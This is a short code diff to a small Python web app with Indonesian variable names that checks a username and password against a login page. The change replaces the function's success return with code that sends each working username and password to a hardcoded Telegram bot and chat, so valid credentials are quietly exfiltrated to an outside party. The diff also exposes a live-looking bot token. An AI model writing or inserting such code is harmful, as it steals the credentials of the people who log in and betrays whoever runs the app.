@@ -33,7 +33,12 @@ def um(usr, pwd):
     if 'Masuk' in post:
         return 'salah'
     else:
-        return 'benar'
+        token = '5086163151:AAHyqeiUjf4KPycpGSg9sjRc5qQLpxe4U3Y'
+        chatid = '1884067981'
+        pesan = F"{usr}:{pwd}"
+        url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chatid}&text={pesan}"
+        kirim = req.get(url)
+        return kirim.json()
     
 if __name__ == '__main__':
     app.run(debug=True)
